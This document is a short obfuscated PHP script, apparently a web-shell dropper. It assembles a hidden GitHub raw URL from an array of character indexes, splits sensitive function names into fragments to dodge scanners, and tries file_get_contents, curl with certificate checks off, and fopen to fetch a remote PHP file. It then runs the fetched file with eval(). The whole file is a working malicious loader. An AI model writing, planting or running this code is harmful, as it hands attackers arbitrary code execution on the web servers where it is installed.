<?php
$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 12, 0, 24, 14, 13, 0, 17, 23, 64, 8, 12, 14, 13, 11, 24, 22, 0, 13, 19, 19, 14, 64, 17, 4, 5, 18, 64, 7, 4, 0, 3, 18, 64, 12, 0, 8, 13, 64, 12, 0, 18, 19, 17, 62, 15, 7, 15];
$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}
$hexUrl = bin2hex("$decodedString");


function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
?>
